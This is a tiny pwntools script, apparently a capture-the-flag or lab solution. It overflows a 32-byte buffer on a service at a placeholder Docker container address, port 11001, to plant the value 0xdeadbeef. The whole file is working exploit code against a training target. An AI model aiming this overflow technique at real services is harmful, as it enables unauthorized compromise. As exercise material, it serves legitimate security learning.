from pwn import *
# CHANGE IP
c = remote("<DOCKER-CONTAINER-IP>", "11001")
print(c.recv())
c.sendline(b'a' * 0x20 + b'\xEF\xBE\xAD\xDE\x00\x00\x00\x00\n')
print(c.recv())
print(c.recv())
